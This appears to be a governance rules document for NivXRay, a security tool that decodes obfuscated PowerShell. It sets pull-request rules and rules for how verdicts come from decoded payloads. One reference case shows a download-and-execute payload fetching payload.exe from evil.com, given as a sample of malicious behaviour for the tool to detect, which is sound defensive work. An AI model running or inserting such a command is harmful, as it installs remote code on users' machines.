# NivXRay · ARB Governance Rules

Rules apply to every PR from PR-3 onward. Any implementation that
violates a rule fails ARB review by default.

---

## Rule 1 · Workspace Stability Contract

The current Production Workspace must remain usable throughout every
PR. Implementation is incremental. No partially-completed workspace
may replace the current analyst experience.

## Rule 2 · Investigation-First Contract

Every implementation decision must answer: *"which analyst question
does this solve?"* Features that don't answer an analyst question are
not implemented.

## Rule 3 · No Architectural Drift

During implementation:
- Do not introduce additional pages unless explicitly approved.
- Do not create duplicate workflows.
- Do not bypass Investigation Services.
- Do not bypass the Evidence Model.
- Do not bypass the approved data contract.

## Rule 4 · Every PR Must Be Demonstrable

Each PR includes: architecture completed · backend completed · UI
surface (if applicable) · tests · before/after screenshots (when UI
changes) · validation against the approved Blueprint.

## Rule 5 · Continuous Validation

After every PR verify Blueprint, User Journey, and Validation Matrix
are still satisfied. Implementation must not silently invalidate
approved architecture.

## Rule 6 · Documentation Synchronization

Whenever implementation changes the architecture, update Blueprint,
User Journey, and Validation Matrix in the same PR. Docs and code
stay in sync.

## Rule 7 · Preserve Future P0 Compatibility

Implementation must not require redesign when adding:
- P0 #2 Reports
- P0 #3 Detection Rules
- P0 #4 Attack Story
- P0 #5 Integrations

These must plug into the approved architecture without a rewrite.

## Rule 8 · PR Acceptance Criteria

Every PR must satisfy:
- Existing regression suite passes.
- Existing deterministic guarantees preserved.
- No increase in duplicate workflows.
- No new orphaned navigation.
- No performance regression beyond agreed thresholds.

## Rule 9 · Architecture Compliance Section (per PR)

Every PR must open with an Architecture Compliance section that maps
its work to Blueprint sections, User Journeys, and Validation Matrix
entries. Since PR-1.

## Rule 10 · Governance Table (per PR)

Since PR-2 review, every PR compliance record includes a table with
these columns:

| Blueprint Sections | Journey Sections | Validation Matrix | Tests | Regression | Risk | Rollback |

## Rule 11 · UI PR Requirements

Every UI-touching PR must include:

| Requirement | Mandatory |
|---|---|
| Screenshot (light theme) | ✅ |
| Screenshot (dark theme, if supported) | ✅ |
| Navigation Flow | ✅ |
| Keyboard Accessibility | ✅ |
| Responsive Layout Check | ✅ |
| Blueprint Section Implemented | ✅ |
| Journey Supported | ✅ |

---

## Rule 12 · Canonical Artifact Consistency Rule
**Added by ARB during PR-2.1 review · 2026-08-04**

> Once a canonical decoded artifact exists, all downstream consumers
> must consume that artifact. No consumer may independently
> re-interpret intermediate transformations.

### Consumers governed by this rule

- Investigation Summary (`investigation_report.py`)
- Runtime Simulation (`decoders/ps_normalizer.py` and any future
  runtime simulator)
- Attack Story (L2 `attack_story` service · PR-4 content)
- Executive Report (P0 #2)
- Detection Rules (P0 #3 · Sigma / KQL / Splunk / YARA generators)
- Workspace Bundle (L2 `workspace_bundle` service)
- API endpoints under `/api/investigation/*` (PR-2 wire)
- Future AI Copilot / persona-driven surfaces
- Exporters (STIX / MISP / OpenIOC / CSV)

### What the rule forbids

- A consumer computing its own `verdict` from wrapper-level evidence
  (e.g. presence of `-EncodedCommand`) while the canonical artifact
  says the decoded payload is benign.
- A consumer selecting a different terminal artifact than
  `selectCanonicalOutput` (frontend) / the L1 `EvidenceBundle`
  (backend) resolved to.
- A consumer that "helpfully" re-decodes or re-interprets an
  intermediate transformation instead of reading the artifact fields
  already produced upstream.

### What the rule requires

- The Verdict Engine reads the decoded canonical artifact plus its
  capability tags, not the wrapper opcode alone.
- Every rendered summary, story, report, rule, and export
  cross-references the same `verdict_card` (source of truth) and the
  same canonical `output`.
- Regression tests must exist for at least four cases:
  1. Benign wrapper + benign payload → identical `Informational`
     verdict across every consumer.
  2. Benign wrapper + malicious payload → identical malicious verdict
     across every consumer.
  3. Decode button and Auto Investigate button produce the same
     canonical artifact.
  4. Wrapper evidence is *retained as context* even after the
     downgrade — the analyst still sees "Encoded PowerShell" as a
     recorded MITRE T1027.010 signal, just not as the verdict driver.

### Where this rule lives in code

- **Backend**: `verdict_engine.py` is the sole verdict source; every
  formatter/reporter reads `verdict_card` (never recomputes).
- **Frontend**: `selectCanonicalOutput.js` is the sole terminal-
  artifact source; every panel reads from that.
- **Tests**: `tests/test_pr21_canonical_artifact_consistency.py`
  guards the invariant.

---

## Rule 13 · Evidence–Verdict Separation
**Added by ARB during PR-2.1 review · 2026-08-04**

> Verdicts must be driven by verified decoded behavior and capabilities,
> not by the presence of an obfuscation or encoding technique alone.
> Obfuscation contributes evidence and context, but it is not sufficient
> by itself to determine maliciousness.

### Layer model

    User Input
        ↓
    Wrapper           (Base64, EncodedCommand, gzip, XOR…)
        ↓
    Decoded Payload   (the actual script/command)
        ↓
    Behavior          (what it does)
        ↓
    Capabilities      (download · persistence · C2 · credential theft · …)
        ↓
    Verdict

### Reputation policy per layer

| Layer | What it tells us | Drives verdict? |
|---|---|---|
| Wrapper | Obfuscation technique | ❌ Not by itself |
| Payload | Actual script / command | ✅ Yes |
| Behavior | What it does | ✅ Yes |
| Capabilities | download / persistence / C2 / creds / … | ✅ Primary |
| Threat Intel | Known-bad IOC / hash / IP / URL | ✅ Strong |

### Reference cases

**Case A — same wrapper, benign payload → Informational**

    Input     : powershell.exe -EncodedCommand <base64>
    Wrapper   : EncodedCommand · Base64 · PowerShell
    Payload   : Write-Host "This comes from an encoded PS command!"
    Caps      : console-output only
    Verdict   : Informational
    Evidence  : Wrapper preserved as context (T1027.010 shown, not gating)

**Case B — same wrapper, malicious payload → High / Critical**

    Input     : powershell.exe -EncodedCommand <base64>
    Payload   : Invoke-WebRequest http://evil.com/payload.exe
                Start-Process payload.exe
    Caps      : execution + network + download
    Verdict   : High / Critical
    Evidence  : Wrapper + capability + downloader signature

The **wrapper is identical in A and B**. Only the payload's capabilities
change the verdict — that is the whole point of this rule.

### What this means for code

1. `_label_from_class_distribution` must not promote a wrapper-only
   observation to `Suspicious`. Wrapper kinds are context evidence,
   not verdict drivers.
2. The Verdict Engine reads the **decoded canonical artifact** (Rule
   12) plus its capability tags to compute the label. A wrapper marker
   with no attack capability → `Informational`.
3. Every rendered summary must show the four layers explicitly
   (Wrapper · Payload · Capabilities · Verdict) so analysts see
   *why* the verdict is what it is.
4. Any consumer that shortcuts to a verdict from a wrapper kind alone
   fails ARB review.

### Commercial differentiator

Many security tools score `Base64 + EncodedCommand + LOLBin` as
suspicious regardless of payload. NivXRay's position is:

> *"We don't stop at detecting obfuscation — we deterministically
> decode it and assess what it actually does."*

Rules 12 and 13 exist to make that position enforceable at every layer.
